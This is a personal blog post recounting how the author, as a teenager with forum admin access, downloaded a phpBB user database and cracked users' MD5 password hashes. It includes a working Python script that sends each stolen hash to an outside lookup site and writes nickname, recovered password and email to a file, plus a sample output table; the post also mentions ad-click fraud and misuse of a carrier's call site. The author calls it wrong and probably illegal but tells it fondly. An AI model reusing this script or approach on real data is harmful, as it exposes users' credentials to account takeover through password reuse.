<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <link href='https://fonts.googleapis.com/css?family=Chivo:900' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Lobster' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen">
    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print">
    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <title>Pablo Reyes</title>
</head>

<body>
    <div id="container">
        <header id="main-header">
    <h1><a href="/">Pablo Reyes</a></h1>
    <h2>Personal Website</h2>
</header>        

        <aside id="sidebar">
    <section id="sidebar-picture">
        <img src="/images/me.jpg" />
    </section>

    <section id="about">
        <a href="http://es.linkedin.com/in/pabloreyesalmagro" style="text-decoration:none;"><span style="font: 80% Arial,sans-serif; color:#0783B6;"><img src="https://static.licdn.com/scds/common/u/img/webpromo/btn_in_20x15.png" width="20" height="15" alt="View Pablo Reyes Almagro's LinkedIn profile" style="vertical-align:middle;" border="0"></span></a>
      <a href="http://github.com/PabloReyes" style="text-decoration:none;"><span style="font: 80% Arial,sans-serif; color:#0783B6;"><img src="http://assets.github.com/images/icons/emoji/octocat.png" width="15" height="15" alt="View Pablo Reyes Almagro's Github profile" style="vertical-align:middle;" border="0"></span></a>
    </section>

    <section id="last-posts">
        <h3>Latest posts</h3>
        <ul>
            
                <li><a href="/blog/stealing-info">Being a good guy, but also stealing personal info</a></li>
            
                <li><a href="/blog/hands-dirty">A curious guy getting hands dirty</a></li>
            
        </ul>
    </section>
</aside>

        <section class="content" id="main">
            <div id="paginator">
    

    
        
                <span class="more">
                <a href="/">
                Newer Posts &raquo; </a>
                </span>
        
    

    <hr>
</div>

<!-- Show last 5 posts here -->

<article class="post">
    <header>
        <h2><a href="/blog/hands-dirty">A curious guy getting hands dirty</a></h2>
        <span class="date"><i class="icon-clock"></i><time datetime="2012-09-17">Sep 17, 2012</time></span><br/>
        <span class="category"><i class="icon-tag"></i> </span><br/>
        <span class="author"><i class="icon-user"></i> </span>
    </header>

    <div class="entry"><p>If I’m curious now, I was even more with 14 or 15 years old. It was the time when I got bored of my shitty C book and started learning Python with online tutorials. I spent so much time on IRC also, mostly in programming channels (although I almost only talked in those dedicated to Age Of Empires, yeah!). I met some people doing much more funny things that what I was doing. A group of friends created a script to auto-click on adsense banners. The group was super private, but I was invited. All of us had a personal blog, so we used the script to click once on each adsense banner every day, so at least we got 8 or 9 clicks a day. Not much, but It helped me buying a better computer (Athlon 3400+, from a P3 866Mhz) by the end of that year (2004 I think).</p>

<p>Ah, they also got access to a private site from Motorola where we could make free mobile calls, but it only lasted a couple of weeks until they noticed. I remember calling a irc-friend to Puerto Rico and talking with his confused mother…</p>

<p>In one of those channels I met a guy running a big website that it’s still running. In it’s first months, the site had more than 20.000 registered users, and don’t ask me why, he thought it would be great that I helped him managing the forums, so he gave me admin privileges. I went directly to the backups panel, looking for the users database. In less than 2 minutes a ~20Mb file was being downloaded with the first real SQL code I had saw.</p>

<p>When I tried to open it with gedit, my computer froze. I got more luck with vim, but I hated those shell-based text editors. The file was full of entries like this (real copy-paste from original):</p>

<div class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">phpbb_users</span> <span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">user_active</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">user_password</span><span class="p">,</span>
<span class="n">user_session_time</span><span class="p">,</span> <span class="n">user_session_page</span><span class="p">,</span> <span class="n">user_lastvisit</span><span class="p">,</span> <span class="n">user_regdate</span><span class="p">,</span>
<span class="n">user_level</span><span class="p">,</span> <span class="n">user_posts</span><span class="p">,</span> <span class="n">user_timezone</span><span class="p">,</span> <span class="n">user_style</span><span class="p">,</span> <span class="n">user_lang</span><span class="p">,</span>
<span class="n">user_dateformat</span><span class="p">,</span> <span class="n">user_new_privmsg</span><span class="p">,</span> <span class="n">user_unread_privmsg</span><span class="p">,</span>
<span class="n">user_last_privmsg</span><span class="p">,</span> <span class="n">user_login_tries</span><span class="p">,</span> <span class="n">user_last_login_try</span><span class="p">,</span> <span class="n">user_emailtime</span><span class="p">,</span>
<span class="n">user_viewemail</span><span class="p">,</span> <span class="n">user_attachsig</span><span class="p">,</span> <span class="n">user_allowhtml</span><span class="p">,</span> <span class="n">user_allowbbcode</span><span class="p">,</span>
<span class="n">user_allowsmile</span><span class="p">,</span> <span class="n">user_allowavatar</span><span class="p">,</span> <span class="n">user_allow_pm</span><span class="p">,</span> <span class="n">user_allow_viewonline</span><span class="p">,</span>
<span class="n">user_notify</span><span class="p">,</span> <span class="n">user_notify_pm</span><span class="p">,</span> <span class="n">user_popup_pm</span><span class="p">,</span> <span class="n">user_rank</span><span class="p">,</span> <span class="n">user_avatar</span><span class="p">,</span>
<span class="n">user_avatar_type</span><span class="p">,</span> <span class="n">user_email</span><span class="p">,</span> <span class="n">user_icq</span><span class="p">,</span> <span class="n">user_website</span><span class="p">,</span> <span class="n">user_from</span><span class="p">,</span> <span class="n">user_sig</span><span class="p">,</span>
<span class="n">user_sig_bbcode_uid</span><span class="p">,</span> <span class="n">user_aim</span><span class="p">,</span> <span class="n">user_yim</span><span class="p">,</span> <span class="n">user_msnm</span><span class="p">,</span> <span class="n">user_occ</span><span class="p">,</span>
<span class="n">user_interests</span><span class="p">,</span> <span class="n">user_actkey</span><span class="p">,</span> <span class="n">user_newpasswd</span><span class="p">)</span> <span class="k">VALUES</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;[USERNAME]&#39;</span><span class="p">,</span>
<span class="s1">&#39;87f6f9d078c3bc5db5578f3b4add9470&#39;</span><span class="p">,</span> <span class="s1">&#39;2147483647&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;2147483647&#39;</span><span class="p">,</span>
<span class="s1">&#39;2147483647&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;0.00&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;english&#39;</span><span class="p">,</span> <span class="s1">&#39;D M d, Y g:i a&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
<span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
<span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;[USER_MAIL_ADDRESS]@hotmail.com&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
<span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="k">NULL</span><span class="p">);</span></code></pre></div>

<p>Obviously I have replaced the username and mail address. There were more than 20.000 entries like that in that file. Passwords were encrypted with MD5, but I knew some online tools like gdataonline (now offline) that could help me finding out the original password. This kind of sites have a huge dictionary of words and common passwords with their corresponding hashes. You search the hash, and get the original string back.</p>

<p>The best thing about gdataonline is that it accepted data via GET and gave the output via XML… That was just perfect for what I had in mind. What if I made a Python script to send the password hashes to gdataonline, and store the successful passwords with their usernames and mail addresses? Since many users use the same password for everything, I would have a really dangerous material. And that was exciting.</p>

<p>First, I made a simple script to split the huge file in 100 parts, so each file would have 200 entries. This had to purpouses:</p>

<ul>
  <li>The idea of reading and parsing a 20Mb file in python didn’t attract me</li>
  <li>I didn’t want to send 20.000 request to gdataonline</li>
</ul>

<p>I could have got all the (username, mail, hash) tuples with a simple SELECT in SQL, and parse the received XML with pyXML. But I didn’t even consider it, I liked it the hard way, the only way I knew. So after some hours of coding, I got this:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
 <span class="c"># -*- coding: iso-8859-15 -*-</span>
 <span class="kn">import</span> <span class="nn">re</span>
 <span class="kn">import</span> <span class="nn">urllib</span>
 <span class="kn">import</span> <span class="nn">os</span>

 <span class="k">def</span> <span class="nf">getPasswords</span><span class="p">():</span>
   <span class="n">successful_passwords</span> <span class="o">=</span> <span class="mi">0</span>
   <span class="n">num</span> <span class="o">=</span> <span class="mi">1</span>

   <span class="nb">file</span> <span class="o">=</span> <span class="s">r&quot;inputFile001&quot;</span> <span class="c">#Change this for every file</span>
   <span class="n">text</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span>
   <span class="n">content</span> <span class="o">=</span> <span class="n">text</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
   <span class="n">text</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
   <span class="n">user</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&quot;VALUES.*?;&quot;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

   <span class="n">output_file</span> <span class="o">=</span> <span class="s">r&quot;outputFile001&quot;</span> <span class="c">#Change this for every file</span>
   <span class="n">foo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span>

   <span class="n">spaces</span> <span class="o">=</span> <span class="s">&quot; &quot;</span><span class="o">*</span><span class="mi">32</span>
   <span class="n">foo</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;Nickname&quot;</span> <span class="o">+</span> <span class="n">spaces</span> <span class="o">+</span> <span class="s">&quot;Password&quot;</span> <span class="o">+</span> <span class="n">spaces</span> <span class="o">+</span> <span class="s">&quot;Mail&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r</span><span class="s">&quot;</span><span class="p">)</span>
   <span class="n">foo</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;-&#39;</span> <span class="o">*</span> <span class="mi">90</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r</span><span class="s">&quot;</span><span class="p">)</span>

   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">user</span><span class="p">:</span>
     <span class="n">nickname</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">)</span>
     <span class="n">mail</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">39</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">)</span>

     <span class="n">f</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s">&quot;http://gdataonline.com/qkhash.php?mode=xml&amp;amp;hash=</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">))</span>
     <span class="n">xml</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
     <span class="n">passwords</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&quot;.*?&quot;</span><span class="p">,</span> <span class="n">xml</span><span class="p">)</span>

     <span class="k">if</span> <span class="n">passwords</span><span class="p">:</span> <span class="c"># If we get the original</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">passwords</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
         <span class="n">successful_passwords</span> <span class="o">+=</span><span class="mi">1</span>

    <span class="n">foo</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">nickname</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="o">+</span> <span class="n">password</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="o">+</span> <span class="n">mail</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">22</span><span class="p">))</span>
    <span class="n">foo</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r</span><span class="s">&quot;</span><span class="p">)</span>

     <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;clear&quot;</span><span class="p">)</span>
     <span class="k">print</span> <span class="s">&quot;Total: </span><span class="si">%i</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
     <span class="k">print</span> <span class="s">&quot;Analized: </span><span class="si">%i</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">num</span>
     <span class="k">print</span> <span class="s">&quot;Found: </span><span class="si">%i</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">successful_passwords</span>

     <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>

   <span class="n">foo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
   <span class="k">print</span> <span class="s">&quot;</span><span class="si">%i</span><span class="s"> passwords have been found&quot;</span> <span class="o">%</span> <span class="n">successful_passwords</span>

 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
   <span class="n">getPasswords</span><span class="p">()</span></code></pre></div>

<p>Tachan! Probably not the most beautiful, organized, well documented, optimized or fast code you have seen, but you can imagine what I felt when I opened my just created file (obviously I changed data)…</p>

<table>
  <tbody>
    <tr>
      <td>_.Nickname</td>
      <td>_.Password</td>
      <td>_.Mail</td>
    </tr>
    <tr>
      <td>john</td>
      <td>mylove_1234</td>
      <td>johny_the_cool@hotmail.com</td>
    </tr>
    <tr>
      <td>mike</td>
      <td>kansas70000</td>
      <td>the_big_boy@yahoo.com</td>
    </tr>
    <tr>
      <td>admin</td>
      <td>lalalalaImDaAdmin</td>
      <td>admin@thissite.com</td>
    </tr>
    <tr>
      <td>….</td>
      <td>….</td>
      <td>….</td>
    </tr>
  </tbody>
</table>

<p>I got  ~30% of passwords revealed, 60 passwords per file, 6000 passwords in total.</p>

<p>This was the time I realised how funny and useful programming could be. I didn’t have any other intention that doing something to get a real result, no more ordering lists or math problems. I felt important, I knew that what I had done wasn’t right, and probably was illegal, but it gave me the satisfaction I needed to keep learning, with more enthusiasm than ever.</p>
</div>
</article>


        </section>
    </div>
</body>
</html>